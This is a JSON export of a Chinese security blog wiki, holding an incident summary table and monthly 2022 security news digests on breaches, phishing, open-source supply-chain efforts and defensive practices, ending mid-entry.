{"data":{"allMdx":{"nodes":[{"fields":{"slug":"/placeholder/","title":"This Is a Placeholder File for Mdx"},"frontmatter":{"draft":true},"rawBody":"---\ntitle: This Is a Placeholder File for Mdx\ndraft: true\ntags:\n  - gatsby-theme-primer-wiki-placeholder\n---\n"},{"fields":{"slug":"/","title":"关于这个站点"},"frontmatter":{"draft":false},"rawBody":"---\r\n\r\n---\r\n\r\n# 关于这个站点\r\n\r\n> 开源工具、效率方法、心理学探索的自我提升笔记\r\n\r\n## ✨ 初衷\r\n\r\n对个人知识库的一个补充\r\n**笔记里的知识并不属于你，只有经过消化、应用，才会成为自己的知识。**\r\n\r\n## 这个网站会放些什么东西？\r\n\r\n- 安全通讯 Security.News：分享最新的安全新闻、漏洞披露、黑客攻击和网络安全等方面的信息；跟踪最新的安全趋势和技术发展，以便提供有关如何保护您的网络和数据的信息；不定期更新。\r\n- 安全知识库： 关于网络安全、应用程序安全和数据安全等方面的详细信息；分享最佳实践、工具和技巧，希望能帮助您提高安全意识和技能。\r\n- 博客： 一些技术见解、工具和技巧、经验教训和一些随笔。分享经验和知识，试图帮助大家更好地理解技术领域的某些方面，并提供一些实用的技巧和建议。\r\n  \r\n"},{"fields":{"slug":"/置顶_网络安全事件汇总/","title":"置顶_网络安全事件汇总"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 置顶_网络安全事件汇总\r\ntags:\r\n  - 安全事件\r\n  - Mandiant\r\n  - Facebook\r\n  - AMD\r\n  - Cisco\r\n  - Twilio\r\n  - CloudFlare\r\n  - LastPass\r\n  - Uber\r\n  - Optus\r\n  - Fast\r\n  - Microsoft\r\n---\r\n\r\n## 概述\r\n| **公司名称**   | **概述**                                                     | **TTPs特点**                 |\r\n| -------------- | ------------------------------------------------------------ | -------------------------------- |\r\n| **搜狐**       | 2022年5月18日凌晨，搜狐部分员工邮箱收到诈骗邮件。经调查，实为某员工使用邮件时被意外钓鱼导致密码泄露，进而被冒充财务部盗发邮件。 | 二维码,DGA                       |\r\n| **Mandiant**   | 2022年早些时候，Mandiant 公司发布了一份报告，称网络犯罪团伙“邪恶公司”(Evil Corp) 转用 LockBit 2.0勒索软件来逃避制裁；之后，LockBit 勒索软件团伙将网络安全公司 Mandiant 列入其黑网泄露网站公布的受害者名单。Mandiant 正在调查勒索软件团伙的说法，这个网络犯罪团伙宣称从该公司盗取了356841文件，并计划在网上泄露这些文件。 | 未披露                           |\r\n| **Facebook**   | 2021年底，防网络钓鱼公司 Pixm 的安全研究人员发现，这项钓鱼攻击事件从去年Q4才开始，但已经证明非常成功。在 Pixm 发现的大约400个登陆页面中，仅仅一个在2021年就有270万的访问量，并且在2022年已经骗取了850万的访问量。 | 域名信誉滥用,蠕虫式传播          |\r\n| **AMD**        | AMD在2022年6月份宣称正在调查一个名为RansomHouse的新数据勒索网络犯罪组织的潜在数据泄露事件。该组织在其暗网上发布了一份更新，声称从芯片制造商那里窃取了“超过450Gb”的数据。 | 弱密码,密码键盘漫游              |\r\n| **Cisco**      | Cisco在2022年8月3日承认，该公司在2022年5月24日遭到入侵，并由思科安全事件应急响应小组（CSIRT）与旗下资安公司Cisco Talos携手补救，起因是一名员工的个人Google帐号遭到骇客入侵。虽然思科并未发现系统被部署勒索木马，但勒索软体集团Yanluowang宣称已取得2.8GB的思科资料。 | 绕过MFA,仿冒域名,Windows登录绕过 |\r\n| **Twilio**     | 2022 年8月4日，Twilio 意识到通过旨在窃取员工凭据的复杂社会工程攻击，未经授权访问与有限数量的 Twilio 客户帐户相关的信息。这种针对我们员工基础的广泛攻击成功地欺骗了一些员工提供他们的证书。然后，攻击者使用被盗的凭据来访问我们的一些内部系统，从而能够访问某些客户数据。 | 仿冒域名                         |\r\n| **CloudFlare** | 2022年8月8日，Twilio分享说，他们受到了有针对性的网络钓鱼攻击的破坏。大约在Twirio受到攻击的同时，CloudFlare看到一个具有非常相似特征的攻击也针对Cloudflare的员工。虽然个别员工确实因网络钓鱼消息而堕落，但我们能够通过自己使用Cloudflare One产品以及向访问我们所有应用程序所需的每位员工发放物理安全密钥来阻止攻击。 | 仿冒域名                         |\r\n| **LastPass**   | 2022年8月25日，据 LastPass 方面表示，黑客透过盗取一个开发者帐户，取得了 LastPass 开发环境的部分权限，有部分源代码和一些专有技术资料因此遭到泄漏，不过客户的资料包括密码则未受影响。 | 未披露                           |\r\n| **Uber**       | 2022年9月16日，网传uber被黑客入侵，并爆出了更多细节，攻击者还获得了对Uber云服务的管理访问权限，包括在亚马逊网络服务（AWS）和谷歌云（GCP）上，Uber在其中存储其源代码和客户数据，以及该公司的HackerOne漏洞赏金计划。 | 绕过MFA,内网横移                 |\r\n| **Optus**      | 2022年9月22日，澳大利亚第二大电信公司Optus宣布它遭受了一次重大数据泄露，该事件涉及1120W+客户的敏感信息。 | IDOR,遍历                        |\r\n| **Fast**       | 2022年9月28日，Fast Comany申明被入侵，黑客通过Apple news推送不当言论。 | 弱密码                           |\r\n| **Microsoft**  | 2022年10月19日微软官方披露了一次敏感数据泄露事件，数据涉及111个国家的65000+个实体，数据大小为2.4TB数据，到目前为止，在分析泄漏的文件时发现了超过33.5万封电子邮件，13.3万个项目和54.8万名暴露的用户；数据还包含客户的联系方式、电子邮箱内容、工作文档、PII（个人身份信息）、产品订单/报价，项目等信息 | 未授权访问                       |\r\n\r\n## 在线完整版\r\n<iframe class=\"airtable-embed\" src=\"https://airtable.com/embed/shrcBBDiOqnxKuTlt?backgroundColor=blue&viewControls=on\" frameborder=\"0\" onmousewheel=\"\" width=\"100%\" height=\"533\" style=\"background: transparent; border: 1px solid #ccc;\"></iframe>"},{"fields":{"slug":"/安全通讯 Security.News/Security.News@202205/","title":"Security.News@202205"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Security.News@202205\r\ntags:\r\n  - 安全通讯 Security.News\r\n  - 供应链安全\r\n  - 行业动态\r\n  - 安全事件\r\n  - 行业报告\r\n  - 学习资源\r\n  - Google\r\n  - 阿里云\r\n  - 蜜罐\r\n  - SOAR\r\n  - 雾帜智能\r\n  - Twitter\r\n  - NSA\r\n  - 最佳实践\r\n  - 数据泄露\r\n  - 钓鱼\r\n---\r\n\r\n## 供应链/开源软件安全\r\n\r\n### **开源安全基金会和 Linux 基金会呼吁1.5亿美元来改善开源安全**\r\n\r\n亚马逊、爱立信、谷歌、英特尔、微软和 VMWare 已经承诺提供3000万美元。更多资金已经在路上了，亚马逊AWS已经承诺额外提供1000万美元。\r\n\r\n以下是开源行业致力于实现的十个目标。\r\n    1. 安全教育: 向所有人提供基线安全软件开发教育和认证。\r\n    2. 风险评估: 为前10,000(或更多) OSS 组件建立一个公开的、供应商中立的、基于客观度量的风险评估仪表板。\r\n    3. 数字签名: 加快采用软件版本的数字签名。\r\n    4. 内存安全: 通过替换非内存安全语言来消除许多漏洞的根本原因。\r\n    5. 事件响应: 建立 OpenSSF 开源安全事件响应小组，安全专家可以在关键时刻协助开源项目响应漏洞。\r\n    6. 更好的扫描: 通过先进的安全工具和专家指导，加速维护人员和专家发现新的漏洞。\r\n    7. 代码审计: 每年对多达200个最关键的开放源码软件组件进行一次第三方代码审查(以及任何必要的补救工作)。\r\n    8. 数据共享: 协调整个行业的数据共享，以改进有助于确定最关键 OSS 组件的研究。\r\n    9. 软件物料清单(SBOMs) : 到处改进 SBOM 的工具和培训，以推动采用。\r\n    10. 改进的供应链: 通过更好的供应链安全工具和最佳实践，加强10个最关键的供应链/开源软件构建系统、包管理器和分销系统。\r\n\r\n#### 一些感悟\r\n> 从Strust2、Heartbleed、Solarwinds到Log4j，可以看到供应链/开源软件的漏洞影响是多么深远，现在越来越多的科技巨头加入治理，希望能改善供应链/开源软件这块“金三角”；对应国内类似的相关治理建议，可以参考CNCERT的《2021 年开源软件供应链安全风险研究报告》。\r\n\r\n#### 参考资料\r\n- https://www.zdnet.com/article/white-house-joins-openssf-and-the-linux-foundation-in-securing-open-source-software/\r\n- https://www.cert.org.cn/publish/main/upload/File/2021%20Risk%20Analysis%20Report%20of%20Open%20Source%20Software%20%20.pdf\r\n\r\n### Google宣布成立“开源维护组”\r\n\r\n在这次会议（前面提到的OpenSSF会议）上，Google宣布成立新的“开源维护小组”——一个由Google工程师组成的敬业团队，他们将与上游维护者紧密合作，提高关键开源项目的安全性。除了这一举措，我们还提出了一些想法，并参与了关于提高开放源码软件的安全性和可信度的讨论。\r\n\r\nGoogle提出了一个用于解决开源漏洞的框架：了解，预防，修复；希望在推进和改进软件供应链安全的事业中产生动力。\r\n    1. 了解：我们“了解”的目标是捕获更精确的漏洞数据，建立一个标准模式来跟踪跨数据库的漏洞，并创建工具来更好地跟踪依赖关系。\r\n        在 Log4j 漏洞响应期间，google 支持的 [Open Source Insights](https://deps.dev/) 项目帮助社区[了解漏洞的影响](https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html)。\r\n    2. 预防：为了帮助用户了解新依赖项的风险，以便他们能够对所使用的包和组件做出明智的决策。\r\n        我们已经看到社区在预防漏洞方面的强有力的参与，尤其是在安全记分卡项目中。[Scorecards](https://securityscorecards.dev/) 评估项目遵守安全最佳实践的情况，并为开发人员在使用依赖项之前可以参考的评分进行分配。\r\n    3. 修复：为了帮助用户理解他们的选择，以消除漏洞，使通知能够帮助加速修复，并修复受影响软件的广泛使用的版本，而不仅仅是最新的版本。\r\n        Google去年为开源项目提供了1500万美元。这包括750万美元，用于供应链安全、模糊、内核安全和关键基础设施安全等领域的定向安全工作。\r\n\r\n#### 一些感悟\r\n> 谷歌是开源的最大商业用户之一，如果没有开源软件，Google的大部分服务都不会存在。\r\n>\r\n> 其实整个互联网行业都是开源软件的最大受益者，但它们已经白嫖习惯了……\r\n\r\n#### 参考资料\r\n- https://blog.google/technology/safety-security/shared-success-in-building-a-safer-open-source-community/\r\n\r\n## 行业动态\r\n\r\n### 阿里云云原生蜜罐重磅发布\r\nHoneyPot技术由来已久，通过诱饵资产与用户真实资产混合部署，提升内网感\r\n\r\n知力、并增加攻击复杂度，是打破攻防不对等的重要手段。\r\n\r\n但是，传统蜜罐欺骗防御方案往往因为成本、真实度等问题不能实现高覆盖，形成“不可能三角〞。\r\n\r\n![阿里云云原生蜜罐](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/dYd6gT.jpg)\r\n    \r\n云蜜罐使用四大技法，打破不可能：\r\n1. VPC黑洞探针\r\n2. 主流应用类型全覆盖\r\n3. 伪装程度随心配置\r\n4. 联动防御与溯源反制\r\n\r\n#### 一些感悟\r\n> 云原生蜜罐的优势在于微服务架构的高灵活性和可维护性，利用云平台设施实现快速部署和弹性伸缩；AWS Marketplace上已经有了很多支持云原生的蜜罐产品。\r\n\r\n#### 参考资料\r\n- https://developer.aliyun.com/article/927892\r\n- https://aws.amazon.com/marketplace/search?searchTerms=honeypot\r\n\r\n### 雾帜智能发布《国内SOAR领域首个Top 10安全剧本最佳实践》\r\n我们邀请过去3年中部分已经部署或即将部署雾帜SOAR（HoneyGuide）的客户进行了一对一的访谈。在本次访谈中，我们一共收集了将近400个在用剧本。我们的专家团队对这400个剧本和我们已有的剧本仓库中的100多个剧本模板，总计约500个剧本进行了统计、分析和评估。最终，我们从中整理了10个被认为通用且最有价值的优秀剧本，借本次产品发布会的机会分享给大家。这些剧本涵盖事件响应、漏洞管理和应急预案等多个方面，希望能抛砖引玉，与大家探讨SOAR剧本的最佳实践。\r\n\r\n剧本列表\r\n\r\n[剧本列表](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/RETRHL.jpg)\r\n\r\n#### 一些感悟\r\n> 看到SOAR平台，我的第一反应就是低代码平台，如Node-RED，但根据Gartner对SOAR最新的定义，强调了SOAR是一种为人提供机器协助的解决方案，重点在人与流程（People and Process），而不是单纯的编排与自动化工具；或许可以称之为SOA for human。\r\n\r\n#### 参考资料\r\n- https://www.secrss.com/articles/24043\r\n\r\n### 美国国家安全局和其盟友发布网络安全建议\r\nCISA 在 NSA 和其他合作伙伴的帮助下制定了该建议。 其中包括 FBI、加拿大网络安全中心 (CCCS)、新西兰国家网络安全中心 (NCSC-NZ) 和计算机应急响应小组 (CERT NZ)、荷兰国家网络安全中心 (NCSC-NL)，以及 英国国家网络安全中心（NCSC-UK）就该咨询。 许多相同的网络安全机构在 4 月 27 日合作发布了补充公告，其中强调了自 2021 年以来最常被利用的漏洞。\r\n\r\nNSA推荐的七大安全最佳实践\r\n    - 访问控制\r\n    - 加固凭据\r\n    - 日志集中管理\r\n    - 使用防病毒软件\r\n    - 部署检测工具\r\n    - 使用安全配置操作在可访问 Internet 的主机上公开的服务\r\n    - 保持软件更新\r\n\r\n#### 一些感悟\r\n> 里面大多数建议都可以在CIS Critical Controls中看到，相当于一个MVP（最小可用产品）。\r\n>\r\n> 引用赵彦在《从Google白皮书看企业安全最佳实践》中提到的一句话：没有业界安全大会上那些花俏的概念和名词，全都是正统的安全设计思路，以既有的简单的安全手段解决复杂的问题。\r\n\r\n#### 参考资料\r\n- https://media.defense.gov/2022/May/17/2002998718/-1/-1/0/CSA_WEAK_SECURITY_CONTROLS_PRACTICES_EXPLOITED_FOR_INITIAL_ACCESS.PDF\r\n- https://www.cisecurity.org/controls\r\n\r\n## 学习资源\r\n### SentinelOne 推荐2022年要关注的22个安全类Twitter账号\r\n\r\n信息安全在于知识分享，在 Twitter 上你会发现我们这个行业最优秀最聪明的人就是这么做的。那么，在2022年，你应该跟随谁来关注时事，扩展你的知识，学习新的技能和资源呢？我们精心挑选了22个重要的网络安全账户，虽然你可以在我们前几年的[Twitter名单](https://www.google.com/search?q=site%3Ahttp%3A%2F%2Fsentinelone.com++twitter+accounts+following&ie=UTF-8&oe=UTF-8)中找到一些推荐，但今年的名单上也有许多新的、有趣的、有影响力的推特用户。让我们来看看吧！\r\n\r\n- 名单\r\n  - [@KimZetter](https://twitter.com/KimZetter)\r\n  - [@maddiestone](https://twitter.com/maddiestone)\r\n  - [@cyb3rops](https://twitter.com/cyb3rops)\r\n  - [@campuscodi](https://twitter.com/campuscodi)\r\n  - [@cglyer](https://twitter.com/cglyer)\r\n  - [@billyleonard](https://twitter.com/billyleonard)\r\n  - [@Kostastsale](https://twitter.com/Kostastsale)\r\n  - [@vxunderground](https://twitter.com/vxunderground)\r\n  - [@likethecoins](https://twitter.com/likethecoins)\r\n  - [@RidT](https://twitter.com/RidT)\r\n  - [@theJoshMeister](https://twitter.com/theJoshMeister)\r\n  - [@ryanaraine](https://twitter.com/ryanaraine)\r\n  - [@craiu](https://twitter.com/craiu)\r\n  - [@AricToler](https://twitter.com/AricToler)\r\n  - [@evacide](https://twitter.com/evacide)\r\n  - [@4n6lady](https://twitter.com/4n6lady)\r\n  - [@zackwhittaker](https://twitter.com/zackwhittaker)\r\n  - [@trufae](https://twitter.com/trufae)\r\n  - [@Fox0x01](https://twitter.com/Fox0x01)\r\n  - [@HostileSpectrum](https://twitter.com/HostileSpectrum)\r\n  - [@GossiTheDog](https://twitter.com/GossiTheDog)\r\n  - [@juanandres_gs](https://twitter.com/juanandres_gs)\r\n\r\n#### 一些感悟\r\n> 好好学习，天天向上；另外推荐两个可以Follow的Twitter List：Offense and Infosec Under 2.5k 。\r\n\r\n#### 参考资料\r\n- https://www.sentinelone.com/blog/22-cybersecurity-twitter-accounts-you-should-follow-in-2022/\r\n\r\n## 安全事件\r\n### 中国互联网公司搜狐的员工被电子邮件欺诈欺骗，承诺给那些提供他们银行数据的人“津贴”\r\n\r\n中国互联网门户网站搜狐网周三表示，20多名员工在一起电子邮件诈骗案中损失超过4万元人民币(合6000美元) ，该诈骗案承诺向提供银行账户和其他个人身份信息的受益人提供“津贴”。\r\n\r\n奇安信、中睿天下和微步在线等厂商均对这一件事件发布了分析报告，完整的攻击过程大致为：\r\n\r\n1. 通过网络攻击手段获取到目标邮件服务器高级权限账号\r\n2. 以财务部、税务局、人力资源和社会保障服务平台及国家社会保险公共服务等部门名义下发的《关于发布2022最新补贴通知》邮件\r\n3. 该封邮件正文中放置了一张二维码图片，诱导收件人扫描正文中二维码。邮件附件的内容和邮件正文一样，并未携带病毒和可执行文件。（该组织利用 DGA 域名生成技术，生成了大量用于做为跳板的 DGA 域名，将其制成二维码。受害者通过手机扫描二维码来解析到对应的钓鱼页面）\r\n4. 通过快捷支付进行盗刷，购买虚拟商品进行分销变现\r\n\r\n#### 一些感悟\r\n> 2021年12月，中国信通院发布的报告称，钓鱼邮件的发件者会模仿成信誉良好的组织或机构，其目标通常是窃取身份验证数据等敏感信息、安装恶意软件或获取信用卡号等其他财务资源。一部分钓鱼攻击属于鱼叉式网络钓鱼，具有高度针对性，但是无确定攻击对象的“广撒网”式钓鱼攻击活动更为普遍。未来较长一段时间内，网络钓鱼攻击将变得越来越常见，并可能和勒索软件、APT攻击等手段相结合，诱饵和所用邮箱也将和企业机构信息有更高的相关度。安全人员可适当开展网络安全培训、网络钓鱼模拟演练等工作，定期督促员工警惕钓鱼攻击的风险和危害，提升员工网络安全意识，防止被网络钓鱼。\r\n\r\n#### 知识扩展\r\n\r\n1. Google的这个防钓鱼测试挺有意思，用来做安全意识培训比干巴巴的文字体验好太多，[https://phishingquiz.withgoogle.com](https://phishingquiz.withgoogle.com/)\r\n2. Microsoft的钓鱼模拟训练，[https://docs.microsoft.com/zh-cn/microsoft-365/security/office-365-security/attack-simulation-training](https://docs.microsoft.com/zh-cn/microsoft-365/security/office-365-security/attack-simulation-training?view=o365-worldwide)\r\n\r\n#### 参考资料\r\n- https://mp.weixin.qq.com/s/qGbwJJ5oGn4tdnFadq0c8g\r\n- https://mp.weixin.qq.com/s/-WjOYPWIEGAUenLsQs7D7w\r\n- https://mp.weixin.qq.com/s/uEiJIFzCqVuFsPzONu7v_A\r\n- https://support.microsoft.com/zh-cn/windows/%E9%98%B2%E8%8C%83%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC-0c7ea947-ba98-3bd9-7184-430e1f860a44\r\n\r\n## 行业报告\r\n\r\n### Verizon Business 发布了2022年数据泄露调查报告\r\n主要发现包括: \r\n1. 勒索软件攻击事件同比增加了13% ，比过去5年的总和还要多\r\n2. 大约五分之四的违规行为可归因于有组织犯罪，外部行为者在一个组织中造成违规行为的可能性大约是内部行为者的4倍\r\n3. 在过去的一年中，82% 的数据泄露都与人为因素有关\r\n\r\n#### 一些感悟\r\n> 正如Lapsus$靠买通内部人员拿下一家又一家的知名公司一样，人为因素一直是导致网络安全事件的主要原因，安全不光是技术对抗，更多的是人之间的对抗；而在现代企业的网络安全防御体系中，人也是最不受重视的环节，大家衷于采购最先进的网络安全技术和方案，并试图提高安全工具集成度和自动化水平，却在员工安全意识上投入不足。人员漏洞是最危险也最容易修复的漏洞（不需要昂贵的技术产品和顶尖技术人才），同时也是最难修复的漏洞（不被重视、缺乏预算）。\r\n>\r\n> RSAC 2020的主题是：“人是安全要素”，RSAC在发布本次大会主题时宣称，网络安全不断发展，我们不断提出旨在阻止威胁的新策略和新方法。人工智能和机器学习等新技术比以往任何时候都更有效率地与不良行为者作战。高级恶意工具的日益普及、成本更低，使网络犯罪更加平民化。“人是安全的关键要素”这一基本认识似乎已被遗忘。但无论是安全防护还是攻击背后的恒久力量一直都是人。即便进入安全自动化时代，我们应对网络攻击的最宝贵的武器将永远是自己。因此，进入21世纪的第三个十年，RSAC2020成为提醒业界记起“人是安全要素”这一基本认识的好时机。\r\n>\r\n> 知名黑客Kevin Mitnick在15年前曾写道：人，而非技术，才是安全最弱的一环。在其畅销书《欺骗的艺术：控制安全中人的要素》，Kevin Mitnick证实了，即便没有高级的黑客技术，社工手段依然可以导致大规模数据泄露。\r\n\r\n#### 参考资料\r\n- https://www.verizon.com/business/resources/reports/2022/dbir/2022-data-breach-investigations-report-dbir.pdf"},{"fields":{"slug":"/安全通讯 Security.News/Security.News@202206/","title":"Security.News@202206"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Security.News@202206\r\ntags:\r\n  - 安全通讯 Security.News\r\n  - 行业动态\r\n  - 安全事件\r\n  - 行业报告\r\n  - TTPs动态\r\n  - 学习资源\r\n  - Mandiant\r\n  - RSAC\r\n  - 创新沙盒\r\n  - 钓鱼\r\n  - ICMP隧道\r\n  - 风险评估\r\n  - Google\r\n  - Bypass\r\n  - CSP\r\n  - AMD\r\n  - TTPs\r\n  - 学习资源\r\n---\r\n\r\n## 安全事件\r\n### LockBit 勒索软件的团伙声称已经入侵了网络安全公司 Mandiant，该公司正在调查所谓的安全事件\r\n\r\n本月早些时候，Mandiant 公司发布了一份报告，称网络犯罪团伙“邪恶公司”(Evil Corp) 转用 LockBit 2.0勒索软件来逃避制裁；之后，LockBit 勒索软件团伙将网络安全公司 Mandiant 列入其黑网泄露网站公布的受害者名单。Mandiant 正在调查勒索软件团伙的说法，这个网络犯罪团伙宣称从该公司盗取了356841文件，并计划在网上泄露这些文件。\r\n\r\nMandiant 公司迅速回应了记者的置评请求，并发表声明称: “ Mandiant 公司知道这些与 lockbit 相关的声明。在这一点上，我们没有任何证据支持他们的说法。我们将继续密切关注事态发展。”\r\n\r\n![JLtatI](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/JLtatI.jpg)\r\n\r\n#### 一些感悟\r\n> 等待更多细节披露，持续跟进中\r\n\r\n#### 参考资料\r\n- https://financialpost.com/technology/lockbit-claims-mandiant-data-will-be-published-mandiant-says-no-evidence-of-theft\r\n\r\n### 一个网络罪犯团队在4个月内偷走了100万 Facebook 账户凭证\r\n\r\n2021年底，防网络钓鱼公司 Pixm 的安全研究人员发现，这项钓鱼攻击事件从去年Q4才开始，但已经证明非常成功。在 Pixm 发现的大约400个登陆页面中，仅仅一个在2021年就有270万的访问量，并且在2022年已经骗取了850万的访问量。\r\n\r\nPixm 确定了大约400个独特的钓鱼页面; 对其中17个页面的随机分析显示，平均浏览量为985,228页。推算到400页，你会得到399,017,673次访问。“我们估计，迄今为止确定的400个用户名，以及他们所有独特的钓鱼网页，只代表了这个活动的一小部分,”Pixm 说。\r\n\r\n#### 一些感悟\r\n> 攻击者使用合法的站点托管网站（例如 glitch.me、 Famous.co、amaze.co、funnel-preview.com 等）来绕过Facebook的检测，通过Facebook Messager传播，这种模式对于基于URL信誉度的传统解决方案是毁灭性打击的，而基于内容的检测可能是因为成本过大而无法大规模应用。这种模式的攻击已经非常成熟了，历史上经典的案例包括：Github Page、Google Translate、Azure Blob 存储、Amazon Cloudfront等。\r\n\r\n#### 参考资料\r\n- https://pixmsecurity.com/blog/blog/phishing-tactics-how-a-threat-actor-stole-1m-credentials-in-4-months/\r\n- https://www.theregister.com/2022/06/09/facebook_phishing_campaign/\r\n- https://www.proofpoint.com/us/threat-insight/post/threat-actors-abuse-github-service-host-variety-phishing-kits\r\n\r\n### AMD服务的450GB数据被窃取\r\n\r\n勒索集团 RansomHouse 声称，AMD 员工使用的“123456”等简单密码使窃取数据变得容易。\r\n\r\n根据 [TechCrunch](https://techcrunch.com/2022/06/28/amd-extortion-ransomhouse/) 的报道，他们已经看到了一些被盗的数据，RansomHouse不是在开玩笑，密码很简单。AMD 的员工显然是依靠密码，如“password”，“123456”和“Welcome1”来保护他们的帐户。我们都知道这不是个好主意。\r\n\r\n#### 一些感悟\r\n> 弱口令是老生常谈的话题了，没想到2022年了，AMD居然还在使用这些密码。\r\n>\r\n> 简单统计了下RansomHouse公开的数据，共xx条记录，其中password 89条，P@ssw0rd 72条，Amd!23 31条，Welcome1 21条，p@ssw0rd1 9条。\r\n>\r\n> 有意思的是，键盘漫游模式的密码也出现了好几次，具体可以看这里 https://twitter.com/PyroTek3/status/1473036483661553669\r\n\r\n#### 参考资料\r\n- https://techcrunch.com/2022/06/28/amd-extortion-ransomhouse/\r\n\r\n## 行业动态\r\n### 以色列网络安全创业公司 Talon 在 RSA 大会上被评为“最具创新力”\r\n\r\nRSA 公司周二宣布，信息安全事件 RSA 会议已经将以色列的 Talon Cybersecurity 评为年度 RSAC 创新沙盒大赛的获胜者。\r\n\r\nTalon 被评为“最具创新性的初创企业”，由一组评委选出，创造了业内第一个安全的企业浏览器，使企业能够简化其安全程序，同时提供安全和改进的混合工作体验。\r\n\r\n#### 一些感悟\r\n> 云上安全一般可以分为两类：保护企业云上自有业务，以及保护员工安全的访问云上业务。考虑到国外企业大量使用Web服务或SaaS服务，各类业务事实上就是Web服务或SaaS形态，所以后者的场景可以泛化为保护员工访问各类外部服务。\r\n>\r\n> 从Talon的白皮书可以看出，它已经将自己定位成一款Web应用和SaaS的网关类产品，同时提供了运行时隔离、零信任、数据防泄露等能力。\r\n>\r\n> 浏览器可以是天然的零信任agent。\r\n\r\n#### 参考资料\r\n- https://talon-sec.com/resources/whitepapers/white-paper-an-enterprise-browser-for-the-digital-business/\r\n- http://blog.nsfocus.net/rsa2022-talon-cyber-security-win/\r\n\r\n### 美国 HHS 安全风险评估工具发布3.3版本\r\n\r\n美国卫生与公众服务部(HHS)民权办公室(OCR)和国家卫生信息技术协调员(ONC)发布了安全风险评估(SRA)工具3.3版。SRA“旨在帮助医疗保健提供者按照 HIPAA 安全规则和医疗保险和医疗补助服务中心(CMS)电子健康记录(EHR)激励计划的要求进行安全风险评估。”\r\n\r\n#### 一些感悟\r\n> 民权办公室 (OCR) 和国家卫生信息技术协调员办公室 (ONC)开发了 SRA 工具，以帮助 HIPAA 涵盖的实体根据HIPAA 安全规则导航风险评估要求。\r\n>\r\n> SRA 工具的受众主要包括中小型供应商，可能不适用于较大的组织；内容主要为政策和合规为主，做起来比实际的安全防御/控制能力建设要简单许多。\r\n\r\n#### 参考资料\r\n- https://healthitsecurity.com/news/onc-ocr-release-updated-version-of-hhs-security-risk-assessment-sra-tool\r\n- https://www.healthit.gov/topic/privacy-security-and-hipaa/security-risk-assessment-tool\r\n\r\n## 行业报告\r\n### 黑客组织Gallium使用新的难以检测的远程访问木马\r\n\r\nUnit 42最近发现了一种新的、难以检测的远程访问木马程序，名为 PingPull，正在被一个叫做进阶持续性渗透攻击(APT)的组织 GALLIUM 使用。\r\n\r\nPingPull 具有利用三种协议(ICMP、 HTTP (S)和原始 TCP)进行命令和控制(C2)的能力。尽管使用 ICMP 隧道并不是一种新技术，PingPull 使用 ICMP 使得检测其 C2通信变得更加困难，因为很少有组织在其网络上实现对 ICMP 流量的检查。\r\n\r\n#### 一些感悟\r\n> 之前就有人使用ICMP/DNS隧道来免费上网，就是利用运营商/网管无法对这些协议进行计费认证，且难以禁止使用的空子来实现的。作为防守方，我们不光要监控常用的TCP/UDP，更应该对ICMP/DNS的使用额外关注，这里往往会成为检测盲点。\r\n\r\n#### 参考资料\r\n- https://unit42.paloaltonetworks.com/pingpull-gallium/\r\n- https://zgao.top/%E5%88%A9%E7%94%A8ptunnel%E5%BB%BA%E7%AB%8Bicmp%E9%9A%A7%E9%81%93%E5%AE%9E%E7%8E%B0%E8%81%94%E9%80%9A%E6%A0%A1%E5%9B%AD%E7%BD%91%E5%85%8D%E6%B5%81/\r\n\r\n## TTPs动态\r\n### 使用悬挂 iframe 绕过 CSP\r\n\r\nCSP 将about:blank URL 视为同源（同源策略），当攻击者将跨域 iframe 设置为 about:blank 时，它就变得可以被攻击者读取；虽然Chrome之前针对****Dangling markup injection****的缓解措施有一定的用处，但通过滥用浏览器特性，可以绕过这些缓解措施，并通过注入获得跨域信息——即使在你的 CSP 中禁用了 JavaScript。\r\n\r\n#### 一些感悟\r\n> portswigger真的是把web安全玩透了，一直可以从他们这里学到各种新姿势、新思路。\r\n\r\n#### 参考资料\r\n- https://portswigger.net/research/bypassing-csp-with-dangling-iframes\r\n\r\n## 学习资源\r\n## Google chronicle提供的一些学习资源\r\n\r\n探索 Chronicle 资源，包括白皮书、网络研讨会、案例研究和数据表。\r\n\r\n#### 一些感悟\r\n> 值得仔细看看，竞品分析必备良器。\r\n\r\n#### 参考资料\r\n- https://chronicle.security/knowledge-base/\r\n"},{"fields":{"slug":"/安全通讯 Security.News/Security.News@202207/","title":"Security.News@202207"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Security.News@202207\r\ntags:\r\n  - 安全通讯 Security.News\r\n  - 行业动态\r\n  - 供应链安全\r\n  - 友商动态\r\n  - 安全演习\r\n  - Github\r\n  - Microsoft\r\n  - 安全加固\r\n---\r\n\r\n## 行业动态\r\n### Cyber Europe 2022:欧盟完成大规模网络战演习\r\n\r\n来自欧洲各地的网络安全专家刚刚完成了迄今为止规模最大的国际网络危机模拟之一;Cyber Europe 2022有来自欧盟和欧洲自由贸易区(EFTA)29个国家的800多名网络安全专家以及欧盟机构和部门参加。\r\n\r\n- 第一天演习内容包括**篡改实验室结果等虚假宣传活动**，以及**对欧洲医院网络发动攻击**。\r\n- 第二天演习的安全事件进一步升级为欧盟范围内。有**攻击者威胁将发布个人医疗数据**，而另一个团伙则**在网上散布植入式医疗设备存在漏洞的谣言**。\r\n- 此次演习测试了各参与方的事件响应能力，以及欧盟各机构与欧洲计算机应急响应小组（CERT-EU）、欧盟网络与信息安全局（ENISA）合作提高态势感知能力的成效。此次演习中吸取的经验教训，将在ENISA发布的事后报告中正式公布。\r\n\r\n#### 一些感悟\r\n> 因为疫情原因，2020年的演习延期到2022年才进行，这种涉及29个国家的网络战演习组织难度一定很大，可以期待下2022年的事后报告公布。\r\n>\r\n> 2018年的事后报告可以看[这里](https://www.enisa.europa.eu/publications/cyber-europe-2018-after-action-report/at_download/fullReport#:~:text=Cyber%20Europe%202018%20was%20the,and%20Information%20Security%20(ENISA).)，有空的话我也会进行解读。\r\n\r\n#### 参考资料\r\n- https://portswigger.net/daily-swig/cyber-europe-2022-eu-completes-large-scale-cyber-war-game-exercise\r\n- 